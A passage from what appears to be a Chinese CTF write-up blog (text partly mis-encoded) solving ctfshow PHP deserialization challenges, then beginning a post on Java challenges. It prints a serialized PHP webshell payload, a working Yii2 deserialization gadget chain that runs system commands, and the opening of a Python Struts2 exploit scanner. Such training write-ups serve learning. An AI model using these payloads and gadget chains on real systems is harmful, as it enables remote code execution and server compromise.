class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payloadï¼›</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class User&#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public $password;</span><br><span class="line">    public $status;</span><br><span class="line">    function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username = $username;</span><br><span class="line">        $this-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line">    function setStatus($s)&#123;</span><br><span class="line">        $this-&gt;status=$s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$user=new User(&#x27;1.php&#x27;,&#x27;&lt;?php eval($_POST[1]);phpinfo();?&gt;&#x27;);</span><br><span class="line">$res=&quot;|&quot;.serialize($user);</span><br><span class="line">echo $res;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiIxLnBocCI7czo4OiJwYXNzd29yZCI7czozNDoiPD9waHAgZXZhbCgkX1BPU1RbMV0pO3BocGluZm8oKTs/PiI7czo2OiJzdGF0dXMiO047fQoK</span><br></pre></td></tr></table></figure>

<p>æŠ“åŒ…æ”¹limitå€¼</p>
<p>è®¿é—®check.phpå®ç°ååºåˆ—åŒ–shellçš„å†™å…¥ï¼Œä¼šå†™åˆ°æ ¹ç›®å½•æŒºå¥‡æ€ªçš„</p>
<p>url&#x2F;log-1.php</p>
<p>èšå‰‘è¿æ¥</p>
<h2 id="web264æœªå†™"><a href="#web264æœªå†™" class="headerlink" title="web264æœªå†™"></a>web264æœªå†™</h2><h2 id="web265"><a href="#web265" class="headerlink" title="web265"></a>web265</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token=<span class="variable">$t</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;token===<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;<span class="comment">//ä½¿token=password å¾—return 1; echo flag</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br><span class="line"><span class="variable">$ctfshow</span>-&gt;token=<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctfshow</span>-&gt;<span class="title function_ invoke__">login</span>())&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>tokençš„å€¼ç­‰äºä¸€ä¸ªéšæœºæ•°ï¼Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class ctfshowAdmin</span><br><span class="line">&#123;</span><br><span class="line">    public $password;</span><br><span class="line">    public $token;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;password = &amp;$this-&gt;token;</span><br><span class="line">    &#125;//ä¸èƒ½ç›´æ¥ç­‰äº</span><br><span class="line">&#125;</span><br><span class="line">$a = new ctfshowAdmin();</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>

<p>å¼•ç”¨ï¼ˆ&amp;ï¼‰çš„ç”¨æ³•å’Œåº”ç”¨</p>
<p>åœ¨PHP ä¸­å¼•ç”¨çš„æ„æ€æ˜¯ï¼š<strong>ä¸åŒçš„åå­—è®¿é—®åŒä¸€ä¸ªå˜é‡å†…å®¹</strong></p>
<p><a href="https://www.cnblogs.com/alsf/p/9621362.html">https://www.cnblogs.com/alsf/p/9621362.html</a></p>
<p>ctfshow{b3af121a-ce30-4452-a80f-9701f229041c}</p>
<h2 id="web266"><a href="#web266" class="headerlink" title="web266"></a>web266</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$cs</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctfshowo</span>=@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$cs</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$cs</span>))&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Error <span class="subst">$ctfshowo</span>&quot;</span>,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTFSHOW</span></span>&#123;&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">CTFSHOW</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:7:&quot;CTFSHOW&quot;:0:&#123;&#125;</span><br></pre></td></tr></table></figure>

<p>PHPç‰¹æ€§ï¼šå‡½æ•°åå’Œç±»åä¸åŒºåˆ†å¤§å°å†™ï¼Œå˜é‡ååŒºåˆ†ã€‚</p>
<p>ç»è¿‡å°è¯•hackbar,ä¸èƒ½post  php:&#x2F;&#x2F;input,é™¤äº†max hackbar,ä¼ å‚å¾—åˆ°</p>
<p>ctfshow{2769a98f-097f-4919-aa09-f64ef83591dd}</p>
<h2 id="web267yii"><a href="#web267yii" class="headerlink" title="web267yii"></a>web267yii</h2><p>yii ååºåˆ—åŒ–æ¼æ´</p>
<p>Yiiæ˜¯ä¸€å¥—åŸºäºç»„ä»¶ã€ç”¨äºå¼€å‘å¤§å‹Webåº”ç”¨çš„é«˜æ€§èƒ½PHPæ¡†æ¶ã€‚Yii2 2.0.38 ä¹‹å‰çš„ç‰ˆæœ¬å­˜åœ¨<a href="https://so.csdn.net/so/search?q=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1001.2101.3001.7020">ååºåˆ—åŒ–</a>æ¼æ´ï¼Œç¨‹åºåœ¨è°ƒç”¨unserialize æ—¶ï¼Œæ”»å‡»è€…å¯é€šè¿‡æ„é€ ç‰¹å®šçš„æ¶æ„è¯·æ±‚æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">CreateAction</span>&#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checkAccess = <span class="string">&#x27;phpinfo&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;id = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>\<span class="title class_">CreateAction</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> <span class="title class_">CreateAction</span>(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">db</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Faker</span>\<span class="title class_">Generator</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title class_">echo</span> <span class="title class_">base64_encode</span>(<span class="title class_">serialize</span>(<span class="title class_">new</span> <span class="title class_">yii</span>\<span class="title class_">db</span>\<span class="title class_">BatchQueryResult</span>));</span><br><span class="line">    <span class="comment">//TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6NzoicGhwaW5mbyI7czoyOiJpZCI7czoxOiIxIjt9aToxO3M6MzoicnVuIjt9fX19</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">CreateAction</span>&#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checkAccess = <span class="string">&#x27;passthru&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;id = <span class="string">&#x27;tac /flag&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>\<span class="title class_">CreateAction</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> <span class="title class_">CreateAction</span>(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">db</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Faker</span>\<span class="title class_">Generator</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title class_">echo</span> <span class="title class_">base64_encode</span>(<span class="title class_">serialize</span>(<span class="title class_">new</span> <span class="title class_">yii</span>\<span class="title class_">db</span>\<span class="title class_">BatchQueryResult</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="web268"><a href="#web268" class="headerlink" title="web268"></a>web268</h2><h2 id="web276pharååºåˆ—åŒ–"><a href="#web276pharååºåˆ—åŒ–" class="headerlink" title="web276pharååºåˆ—åŒ–"></a>web276pharååºåˆ—åŒ–</h2>]]></content>
      <categories>
        <category>web</category>
        <category>ctfshow</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow-java</title>
    <url>/2023/04/18/ctfshow%E5%90%88%E9%9B%86-ctfshow-java/</url>
    <content><![CDATA[<p>â€‹    ctfshow-java</p>
 <span id="more"></span>



<p><a href="https://github.com/Vancomycin-g/Struts2Scan">https://github.com/Vancomycin-g/Struts2Scan</a></p>
<p>æ”¹è‰¯ç‰ˆçš„</p>
<p>æˆ–è€…ç”¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">import shlex</span><br><span class="line">import random</span><br><span class="line">import base64</span><br><span class="line">import copy</span><br><span class="line">import os</span><br><span class="line">import hashlib</span><br><span class="line">import string</span><br><span class="line">import click</span><br><span class="line">import requests</span><br><span class="line">import urllib.request</span><br><span class="line">import urllib.parse</span><br><span class="line">import urllib.error</span><br><span class="line">import time</span><br><span class="line">from requests.exceptions import ChunkedEncodingError, ConnectionError, ConnectTimeout</span><br><span class="line">from urllib.parse import quote, unquote</span><br><span class="line">from functools import partial</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">from concurrent import futures</span><br><span class="line"> </span><br><span class="line">__title__ = &#x27;Struts2 Scan&#x27;</span><br><span class="line">__version__ = &#x27;0.1&#x27;</span><br><span class="line">__author__ = &#x27;HatBoy&#x27;</span><br><span class="line"> </span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">åŸºäºäº’è”ç½‘ä¸Šå·²ç»å…¬å¼€çš„Structs2é«˜å±æ¼æ´expçš„æ‰«æåˆ©ç”¨å·¥å…·ï¼Œç›®å‰æ”¯æŒçš„æ¼æ´å¦‚ä¸‹ï¼š</span><br><span class="line">S2-001,S2-003,S2-005,S2-007,S2-008,S2-009,S2-012,S2-013,S2-015,S2-016,S2-019,</span><br><span class="line">S2-029,S2-032,S2-033,S2-037,S2-045,S2-046,S2-048,S2-052,S2-053,S2-devMode</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"> </span><br><span class="line">default_headers = &#123;</span><br><span class="line">    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36&#x27;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"># å…¨å±€ä»£ç†</span><br><span class="line">proxies = None</span><br><span class="line"># è¶…æ—¶æ—¶é—´</span><br><span class="line">_tiemout = 10</span><br><span class="line"># é»˜è®¤è¾“å‡ºæ‰€æœ‰ç»“æœï¼ŒåŒ…æ‹¬ä¸å­˜åœ¨æ¼æ´çš„</span><br><span class="line">is_quiet = False</span><br><span class="line"># è¿›ç¨‹æ•°</span><br><span class="line">process = 10</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def get(url, headers=None, encoding=&#x27;UTF-8&#x27;):</span><br><span class="line">    &quot;&quot;&quot;GETè¯·æ±‚å‘é€åŒ…è£…&quot;&quot;&quot;</span><br><span class="line">    try:</span><br><span class="line">        html = requests.get(url, headers=headers, proxies=proxies, timeout=_tiemout)</span><br><span class="line">        html = html.content.decode(encoding)</span><br><span class="line">        return html.replace(&#x27;\x00&#x27;, &#x27;&#x27;).strip()</span><br><span class="line">    except ChunkedEncodingError as e:</span><br><span class="line">        html = get_stream(url, headers, encoding)</span><br><span class="line">        return html</span><br><span class="line">    except ConnectionError as e:</span><br><span class="line">        return &quot;ERROR:&quot; + &quot;HTTPè¿æ¥é”™è¯¯&quot;</span><br><span class="line">    except ConnectTimeout as e:</span><br><span class="line">        return &quot;ERROR:&quot; + &quot;HTTPè¿æ¥è¶…æ—¶é”™è¯¯&quot;</span><br><span class="line">    except Exception as e:</span><br><span class="line">        return &#x27;ERROR:&#x27; + str(e)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def get_302(url, headers=None, encoding=&#x27;UTF-8&#x27;):</span><br><span class="line">    &quot;&quot;&quot;GETè¯·æ±‚å‘é€åŒ…è£…&quot;&quot;&quot;</span><br><span class="line">    try:</span><br><span class="line">        html = requests.get(url, headers=headers, proxies=proxies, timeout=_tiemout, allow_redirects=False)</span><br><span class="line">        status_code = html.status_code</span><br><span class="line">        if status_code == 302:</span><br><span class="line">            html = html.headers.get(&quot;Location&quot;, &quot;&quot;)</span><br><span class="line">        elif status_code == 200:</span><br><span class="line">            html = html.content.decode(encoding)</span><br><span class="line">            html = html.replace(&#x27;\x00&#x27;, &#x27;&#x27;).strip()</span><br><span class="line">        else:</span><br><span class="line">            html = &quot;&quot;</span><br><span class="line">        return html</span><br><span class="line">    except ConnectionError as e:</span><br><span class="line">        return &quot;ERROR:&quot; + &quot;HTTPè¿æ¥é”™è¯¯&quot;</span><br><span class="line">    except ConnectTimeout as e:</span><br><span class="line">        return &quot;ERROR:&quot; + &quot;HTTPè¿æ¥è¶…æ—¶é”™è¯¯&quot;</span><br><span class="line">    except Exception as e:</span><br><span class="line">        return &#x27;ERROR:&#x27; + str(e)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def get_stream(url, headers=None, encoding=&#x27;UTF-8&#x27;):</span><br><span class="line">    &quot;&quot;&quot;åˆ†å—æ¥å—æ•°æ®&quot;&quot;&quot;</span><br><span class="line">    try:</span><br><span class="line">        lines = requests.get(url, headers=headers, timeout=_tiemout, stream=True, proxies=proxies)</span><br><span class="line">        html = list()</span><br><span class="line">        for line in lines.iter_lines():</span><br><span class="line">            if b&#x27;\x00&#x27; in line:</span><br><span class="line">                break</span><br><span class="line">            line = line.decode(encoding)</span><br><span class="line">            html.append(line.strip())</span><br><span class="line">        return &#x27;\r\n&#x27;.join(html).strip()</span><br><span class="line">    except ChunkedEncodingError as e:</span><br><span class="line">        return &#x27;\r\n&#x27;.join(html).strip()</span><br><span class="line">    except ConnectionError as e:</span><br><span class="line">        return &quot;ERROR:&quot; + &quot;HTTPè¿æ¥é”™è¯¯&quot;</span><br><span class="line">    except ConnectTimeout as e:</span><br><span class="line">        return &quot;ERROR:&quot; + &quot;HTTPè¿æ¥è¶…æ—¶é”™è¯¯&quot;</span><br><span class="line">    except Exception as e:</span><br><span class="line">        return &#x27;ERROR:&#x27; + str(e)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def post(url, data=None, headers=None, encoding=&#x27;UTF-8&#x27;, files=None):</span><br><span class="line">    &quot;&quot;&quot;POSTè¯·æ±‚å‘é€åŒ…è£…&quot;&quot;&quot;</span><br><span class="line">    try:</span><br><span class="line">        html = requests.post(url, data=data, headers=headers, proxies=proxies, timeout=_tiemout, files=files)</span><br><span class="line">        html = html.content.decode(encoding)</span><br><span class="line">        return html.replace(&#x27;\x00&#x27;, &#x27;&#x27;).strip()</span><br><span class="line">    except ChunkedEncodingError as e:</span><br><span class="line">        html = post_stream(url, data, headers, encoding, files)</span><br><span class="line">        return html</span><br><span class="line">    except ConnectionError as e:</span><br><span class="line">        return &quot;ERROR:&quot; + &quot;HTTPè¿æ¥é”™è¯¯&quot;</span><br><span class="line">    except ConnectTimeout as e:</span><br><span class="line">        return &quot;ERROR:&quot; + &quot;HTTPè¿æ¥è¶…æ—¶é”™è¯¯&quot;</span><br><span class="line">    except Exception as e:</span><br><span class="line">        return &#x27;ERROR:&#x27; + str(e)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def post_stream(url, data=None, headers=None, encoding=&#x27;UTF-8&#x27;, files=None):</span><br><span class="line">    &quot;&quot;&quot;åˆ†å—æ¥å—æ•°æ®&quot;&quot;&quot;</span><br><span class="line">    try:</span><br><span class="line">        lines = requests.post(url, data=data, headers=headers, timeout=_tiemout, stream=True, proxies=proxies,</span><br><span class="line">                              files=None)</span><br><span class="line">        html = list()</span><br><span class="line">        for line in lines.iter_lines():</span><br><span class="line">            line = line.decode(encoding)</span><br><span class="line">            html.append(line.strip())</span><br><span class="line">        return &#x27;\r\n&#x27;.join(html).strip()</span><br><span class="line">    except ChunkedEncodingError as e:</span><br><span class="line">        return &#x27;\r\n&#x27;.join(html).strip()</span><br><span class="line">    except ConnectionError as e:</span><br><span class="line">        return &quot;ERROR:&quot; + &quot;HTTPè¿æ¥é”™è¯¯&quot;</span><br><span class="line">    except ConnectTimeout as e:</span><br><span class="line">        return &quot;ERROR:&quot; + &quot;HTTPè¿æ¥è¶…æ—¶é”™è¯¯&quot;</span><br><span class="line">    except Exception as e:</span><br><span class="line">        return &#x27;ERROR:&#x27; + str(e)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def encode_multipart(exp):</span><br><span class="line">    &quot;&quot;&quot;åˆ›å»ºmultipart/form-dataæ•°æ®åŒ…&quot;&quot;&quot;</span><br><span class="line">    boundary = &#x27;----------%s&#x27; % hex(int(time.time() * 1000))</span><br><span class="line">    data = list()</span><br><span class="line">    data.append(&#x27;--%s&#x27; % boundary)</span><br><span class="line">    content = b&#x27;x&#x27;</span><br><span class="line">    decoded_content = content.decode(&#x27;ISO-8859-1&#x27;)</span><br><span class="line">    data.append(&#x27;Content-Disposition: form-data; name=&quot;test&quot;; filename=&quot;&#123;exp&#125;&quot;&#x27;.format(exp=exp))</span><br><span class="line">    data.append(&#x27;Content-Type: text/plain\r\n&#x27;)</span><br><span class="line">    data.append(decoded_content)</span><br><span class="line">    data.append(&#x27;--%s--\r\n&#x27; % boundary)</span><br><span class="line">    return &#x27;\r\n&#x27;.join(data), boundary</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def post_file(url, exp, headers=None, encoding=&#x27;UTF-8&#x27;):</span><br><span class="line">    &quot;&quot;&quot;S2-046æ¼æ´ä¸“ç”¨&quot;&quot;&quot;</span><br><span class="line">    try:</span><br><span class="line">        coded_params, boundary = encode_multipart(exp)</span><br><span class="line">        if proxies:</span><br><span class="line">            proxy_support = urllib.request.ProxyHandler(proxies)</span><br><span class="line">            opener = urllib.request.build_opener(proxy_support)</span><br><span class="line">            urllib.request.install_opener(opener)</span><br><span class="line">        req = urllib.request.Request(url, coded_params.encode(&#x27;ISO-8859-1&#x27;))</span><br><span class="line">        req.add_header(&#x27;Content-Type&#x27;, &#x27;multipart/form-data; boundary=%s&#x27; % boundary)</span><br><span class="line">        if headers:</span><br><span class="line">            for key, value in headers.items():</span><br><span class="line">                req.add_header(key, value)</span><br><span class="line">        resp = urllib.request.urlopen(req)</span><br><span class="line">        html = resp.read().decode(encoding)</span><br><span class="line">        return html</span><br><span class="line">    except ConnectionError as e:</span><br><span class="line">        return &quot;ERROR:&quot; + &quot;HTTPè¿æ¥é”™è¯¯&quot;</span><br><span class="line">    except ConnectTimeout as e:</span><br><span class="line">        return &quot;ERROR:&quot; + &quot;HTTPè¿æ¥è¶…æ—¶é”™è¯¯&quot;</span><br><span class="line">    except Exception as e:</span><br><span class="line">        return &#x27;ERROR:&#x27; + str(e)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def parse_cmd(cmd, type=&#x27;string&#x27;):</span><br><span class="line">    &quot;&quot;&quot;å‘½ä»¤è§£æï¼Œå°†è¦æ‰§è¡Œçš„å‘½ä»¤è§£æä¸ºå­—ç¬¦ä¸²æ ¼å¼&quot;&quot;&quot;</span><br><span class="line">    cmd = shlex.split(cmd)</span><br><span class="line">    if type == &#x27;string&#x27;:</span><br><span class="line">        cmd_str = &#x27;&quot;&#x27; + &#x27;&quot;,&quot;&#x27;.join(cmd) + &#x27;&quot;&#x27;</span><br><span class="line">    elif type == &#x27;xml&#x27;:</span><br><span class="line">        cmd_str = &#x27;&lt;string&gt;&#x27; + &#x27;&lt;/string&gt;&lt;string&gt;&#x27;.join(cmd) + &#x27;&lt;/string&gt;&#x27;</span><br><span class="line">    else:</span><br><span class="line">        cmd_str = cmd</span><br><span class="line">    return cmd_str</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def parse_headers(headers):</span><br><span class="line">    &quot;&quot;&quot;å°†headerså­—ç¬¦ä¸²è§£æä¸ºå­—å…¸&quot;&quot;&quot;</span><br><span class="line">    if not headers:</span><br><span class="line">        return default_headers</span><br><span class="line">    new_headers = copy.deepcopy(default_headers)</span><br><span class="line">    headers = headers.split(&#x27;&amp;&#x27;)</span><br><span class="line">    for header in headers:</span><br><span class="line">        header = header.split(&#x27;:&#x27;)</span><br><span class="line">        new_headers[header[0].strip()] = header[1].strip()</span><br><span class="line">    return new_headers</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def get_hash():</span><br><span class="line">    &quot;&quot;&quot;è·å–éšæœºå­—ç¬¦ä¸²&quot;&quot;&quot;</span><br><span class="line">    letters = string.ascii_letters</span><br><span class="line">    rand = &#x27;&#x27;.join(random.sample(letters, 10))</span><br><span class="line">    hash = hashlib.md5(rand.encode()).hexdigest()</span><br><span class="line">    return hash</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def echo_check(self):</span><br><span class="line">    &quot;&quot;&quot;é€šè¿‡echoè¾“å‡ºæ£€æŸ¥æ¼æ´æ˜¯å¦å­˜åœ¨&quot;&quot;&quot;</span><br><span class="line">    hash_str = get_hash()</span><br><span class="line">    html = 